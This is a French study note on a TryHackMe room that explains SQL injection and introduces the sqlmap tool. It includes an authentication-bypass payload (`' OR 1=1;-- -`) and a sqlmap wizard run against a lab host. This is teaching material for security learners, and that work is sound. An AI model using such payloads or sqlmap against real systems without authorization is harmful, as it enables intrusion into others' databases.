#  [SQLMap: The Basics][LienTHM]
## Injection SQL (SQLi)
**SQL**(*Structured Query Language*) est un langage utilisé pour gérer des bases de donnée dans un serveur.  
Lorsque nous entrons nos identifiant sur une page login (ex: `Username: Toto`, `Password: Toto123!`) , cela ressemble très souvent à ça côté serveur :
```bash
SELECT * FROM users WHERE username = 'Toto' AND password = 'Toto123!';
```

A première vu nous ne voyons pas de problème car si l'identifiant ou le mot de passe est incorrect, la conditions sera **FALSE** et donc nous n'aurons pas accès au donnée de **Toto**.  
Sauf qu'il y a un problème : L'utilisateur écrit directement dans la ligne de code SQL, nous pouvons alors faire de l'injection de code SQL.  
Entrons alors `Username: Toto` `Password: test' OR 1=1;-- -`
```bash
SELECT * FROM users WHERE username = 'Toto' AND password = 'test' OR 1=1;-- -';
```
De cette manière, nous avons ajouté une condition dans le code qui est toujours **TRUE** `OR 1=1`, grâce à cela, la requête sera accepter peut importe le mot de passe entrée.  
En y ajoutant `;-- -`, nous passons tout le restes du code en commentaire ce qui fait que les autres potentielles conditions seront ignorées (notamment le guillement qui faut masqué) .  

## SQLMap
`sqlmap` est un outil présent par défaut sur beaucoup de distribution de cybersécurité Linux, il va permettre d'analyser une URL, testé beaucoup d'injections SQL connus pour y retourner les injection qui ont fonctionnées.  
  
L'options `--wizard` sert à guider un utilisateur pas à pas pour faire sont attaques d'injection SQL :
```bash
$sqlmap --wizard
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.4#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:40:58 /2026-11-19/

[14:40:58] [INFO] starting wizard interface
Please enter full target URL (-u): http://sqlmaptesting.thm/search?cat=1
POST data (--data) [Enter for None]:

Injection difficulty (--level/--risk). Please choose:
[1] Normal (default)
[2] Medium
[3] Hard
> 1
Enumeration (--banner/--current-user/etc). Please choose:
[1] Basic (default)
[2] Intermediate
[3] All
1

sqlmap is running, please wait..

[14:41:30] [CRITICAL] host 'sqlmaptesting.thm' does not exist

[*] ending @ 14:41:30 /2026-11-19/

```
Pour les autres options, le mieux est de lire le [**manuel officiel**][Man] ou de visiter de nouveau la room [**SQLMap: Basics**][LienTHM] 

[LienTHM]:https://tryhackme.com/room/sqlmapthebasics
[Man]:https://manpages.org/sqlmap
